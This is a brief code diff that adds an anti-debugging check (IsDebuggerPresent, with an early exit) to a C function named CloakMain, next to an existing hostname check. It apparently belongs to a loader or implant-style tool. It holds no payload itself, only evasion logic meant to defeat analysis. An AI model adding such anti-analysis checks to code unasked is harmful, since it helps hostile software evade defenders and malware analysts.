@@ -3,6 +3,15 @@
 
 int CloakMain(PVOID Reserved) {
 
+    #ifdef ANTI_DEBUG
+    if ( IsDebuggerPresent() ) {
+        #ifdef DEBUG
+        printf("[-] Debugger Detected\n");
+        #endif // !DEBUG
+        return 1;
+    }
+    #endif // !ANTI_DEBUG
+
     #ifdef CHECK_HOSTNAME
     if ( ! CheckHostname( HOSTNAME ) ) {
         #ifdef DEBUG
